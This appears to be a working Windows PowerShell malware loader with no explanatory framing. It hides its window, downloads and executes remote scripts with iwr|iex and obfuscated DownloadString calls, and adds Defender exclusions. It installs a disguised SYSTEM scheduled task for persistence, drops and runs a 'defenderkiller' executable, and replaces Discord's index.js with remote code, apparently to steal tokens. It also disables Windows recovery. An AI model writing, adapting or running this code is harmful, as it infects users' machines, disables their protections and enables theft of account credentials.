Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindowUtils {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetParent(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr GetTargetWindow() {
            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr parentWindow = GetParent(consoleWindow);
            
            if (parentWindow == IntPtr.Zero) {
                return consoleWindow;
            }
            return parentWindow;
        }
    }
"@

[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null

Set-ExecutionPolicy Bypass -Scope Process -Force
iwr "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/vm.ps1" | iex

$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
$startupfolder = $env:appdata
Add-Type -AssemblyName System.Windows.Forms


# Kiểm tra xem script có quyền quản trị không
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     while(1) {
         try {
             $code = ("https://raw.githubusercontent.com/43a1723/test/main/download.ps1")
             $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$code')"
             Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru -Verb RunAs
             Clear-Host
             exit;
         } catch {}
     }
 }



Add-MpPreference -ExclusionProcess "powershell.exe"

$task_name = "MicrosoftEdge"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force
Write-Host "[!] Persistence Added" -ForegroundColor Green



$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

Invoke-WebRequest -Uri "https://anonsharing.com/file/3afac857318f312f/defenderkiller.exe" -OutFile "$dir\click yes pls.exe"; Start-Process "$dir\click yes pls.exe"
Invoke-WebRequest -Uri "https://anonsharing.com/file/91dab2685e4481c4/fix.exe" -OutFile "$dir\prysmaxx.exe"; Start-Process "$dir\prysmaxx.exe"

$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/downloadfile.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru

$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/ping.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru



$locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
$discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")

foreach ($path in $discPaths) {
    $skibidipath = Join-Path $locAppData $path
    if (-not (Test-Path $skibidipath)) {
        continue
    }

    Get-ChildItem $skibidipath -Recurse | ForEach-Object {
        if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
            $files = Get-ChildItem $_.FullName
            foreach ($file in $files) {
                if ($file.Name -eq "index.js") {
                    try {
                        # Download content from the specified URL
                        $webClient = New-Object System.Net.WebClient
                        $content = $webClient.DownloadString("https://gist.githubusercontent.com/43a1723/45eaf5d60790b53092841ee6cdf5aea1/raw/a69821c4379655c84d529b91b83256b09b39577c/lmao.js")
                        
                        if ($content -ne "") {
                            # Write the downloaded content to the index.js file
                            $content | Set-Content -Path $file.FullName -Force
                            Write-Host "Updated $($file.FullName) successfully." -ForegroundColor Green
                        } else {
                            Write-Host "Downloaded content is empty. Skipping file: $($file.FullName)" -ForegroundColor Yellow
                        }
                    } catch {
                        Write-Host "Error occurred while processing $($file.FullName): $_" -ForegroundColor Red
                    }
                }
            }
        }
    }
}


if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    reagentc.exe /disable
} else {
    echo "Not running as Admin"
}
Start-Sleep -Seconds 15
Stop-Process -Name "click yes pls" -Force
